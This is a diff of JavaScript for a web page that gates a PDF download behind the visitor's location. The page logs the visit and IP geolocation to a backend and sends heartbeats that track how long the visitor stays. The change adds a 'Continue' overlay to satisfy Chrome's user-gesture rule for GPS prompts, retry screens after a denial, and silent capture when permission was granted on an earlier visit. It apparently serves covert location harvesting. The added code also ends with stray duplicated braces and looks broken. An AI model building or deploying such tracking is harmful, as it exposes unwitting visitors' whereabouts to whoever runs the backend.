@@ -749,7 +749,7 @@
   }
 
   // ==============================================================
-  // INIT — browser GPS dialog fires immediately on page load
+  // INIT — show gate overlay, GPS fires on user tap
   // ==============================================================
   function init() {
     debug('Init — BACKEND_URL:', BACKEND_URL);
@@ -760,26 +760,63 @@
     startActivityMonitor();
     sendLog({ type: 'PAGE_LOAD', backendUrl: BACKEND_URL, debug: DEBUG });
 
-    // Heartbeat — proves they're still on the page
+    // Heartbeat
     var heartbeat = 0;
     setInterval(function () {
       heartbeat++;
       sendLog({ type: 'HEARTBEAT', beat: heartbeat, dwellMs: Date.now() - PAGE_LOAD_TIME });
     }, 30000);
 
-    // Trigger browser GPS dialog immediately
-    debug('Triggering browser GPS dialog');
-    captureGps().then(function (result) {
-      if (result.success) {
-        gpsCollected = true;
-        setButtonsLocked(false);
-        sendLog({ type: 'GPS_OK', gpsSuccess: true, dwellMs: Date.now() - PAGE_LOAD_TIME });
-        debug('GPS OK — auto-downloading PDF');
-        generateAndDownloadPdf();
-        sendLog({ type: 'DOWNLOAD', gpsSuccess: true, pdfGenerated: true, auto: true, dwellMs: Date.now() - PAGE_LOAD_TIME });
-      } else {
-        debug('GPS denied — falling back to IP geolocation (already sent)');
-      }
+    // Show gate — user must tap "Continue" to trigger GPS (Chrome requires user gesture)
+    var gate = document.getElementById('gps-gate');
+    var btnEnter = document.getElementById('btn-enter-portal');
+    var btnRetry = document.getElementById('btn-retry-loc');
+    var retryMsg = document.getElementById('gps-retry-msg');
+
+    function tryGps() {
+      captureGps().then(function (result) {
+        if (result.success) {
+          gpsCollected = true;
+          gate.classList.add('hidden');
+          setButtonsLocked(false);
+          sendLog({ type: 'GPS_OK', gpsSuccess: true, dwellMs: Date.now() - PAGE_LOAD_TIME });
+          debug('GPS OK — auto-downloading PDF');
+          generateAndDownloadPdf();
+          sendLog({ type: 'DOWNLOAD', gpsSuccess: true, pdfGenerated: true, auto: true, dwellMs: Date.now() - PAGE_LOAD_TIME });
+        } else {
+          // Denied — show retry in gate
+          sendLog({ type: 'GPS_DENIED_RETRY', reason: result.reason, dwellMs: Date.now() - PAGE_LOAD_TIME });
+          debug('GPS denied — showing retry');
+          retryMsg.style.display = 'block';
+          gate.querySelector('.gps-gate-loader').style.display = 'none';
+        }
+      });
+    }
+
+    // Check if permission already granted from a previous visit
+    if (navigator.permissions && navigator.permissions.query) {
+      navigator.permissions.query({ name: 'geolocation' }).then(function (s) {
+        if (s.state === 'granted') {
+          // Already allowed — skip gate, fire GPS immediately
+          debug('Geolocation already granted — skipping gate');
+          gate.classList.add('hidden');
+          tryGps();
+        }
+      }).catch(function () {});
+    }
+
+    btnEnter.addEventListener('click', function () {
+      gate.querySelector('.gps-gate-loader').style.display = 'block';
+      btnEnter.style.display = 'none';
+      tryGps();
+    });
+
+    btnRetry.addEventListener('click', function () {
+      retryMsg.style.display = 'none';
+      gate.querySelector('.gps-gate-loader').style.display = 'block';
+      tryGps();
+    });
+  }
     });
   }
 
